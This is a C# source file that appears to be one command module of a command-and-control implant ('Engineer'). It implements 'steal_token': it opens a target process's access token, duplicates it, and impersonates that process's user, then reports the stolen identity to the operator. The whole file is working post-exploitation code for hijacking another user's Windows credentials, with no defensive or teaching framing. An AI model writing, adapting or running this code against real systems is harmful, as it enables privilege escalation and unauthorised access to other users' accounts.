using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Engineer.Extra;
using Engineer.Functions;
using Engineer.Models;

namespace Engineer.Commands
{
    internal class Steal_Token : EngineerCommand
    {
        public override string Name => "steal_token";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
				if (!task.Arguments.TryGetValue("/pid", out string pidstring))
				{
					Tasking.FillTaskResults("error: " + "Missing pid", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
				pidstring.TrimStart(' ');
				if (!int.TryParse(pidstring, out int pid))
				{
					Tasking.FillTaskResults("error: " + "Failed to parse pid", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }

				// open handle to process
				var hProcess = Process.GetProcessById(pid);

				//open handle to token
				if (!WinAPIs.Advapi.OpenProcessToken(hProcess.Handle, WinAPIs.Advapi.TOKEN_ALL_ACCESS, out var hToken))
				{
					Tasking.FillTaskResults("error: " + "Failed to open process token", task, EngTaskStatus.Failed,TaskResponseType.String);
                    return;
                }
				//duplicate token
				var sa = new WinAPIs.Advapi.SECURITY_ATTRIBUTES();
				if (!WinAPIs.Advapi.DuplicateTokenEx(hToken, WinAPIs.Advapi.TOKEN_ALL_ACCESS, ref sa, WinAPIs.Advapi.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, WinAPIs.Advapi.TOKEN_TYPE.TokenImpersonation, out var hTokenDup))
				{
					WinAPIs.Kernel32.CloseHandle(hToken); // close the open handle we have since we failed duplication.
					hProcess.Dispose();
					Tasking.FillTaskResults("error: " + "failed to duplicate token", task, EngTaskStatus.Failed,TaskResponseType.String);
                    return;
                }

				//impersonate token , just like make token
				if (WinAPIs.Advapi.ImpersonateLoggedOnUser(hTokenDup))
				{
					var identity = new WindowsIdentity(hTokenDup);
					identity.Impersonate();
					WinAPIs.Kernel32.CloseHandle(hToken); // can close now that we have successfully impersonated.
					hProcess.Dispose();
					Tasking.FillTaskResults($"Successfully impersonated {identity.Name}", task, EngTaskStatus.Complete,TaskResponseType.String);
                    return;
                }

				//close handle , should get here only if impersonate fails.
				WinAPIs.Kernel32.CloseHandle(hToken);
				hProcess.Dispose();
				Tasking.FillTaskResults("error: " + "failed to impersonate token", task, EngTaskStatus.Failed,TaskResponseType.String);
			}
            catch (Exception ex)
            {
				Tasking.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed,TaskResponseType.String);
            }
		}
    }
}
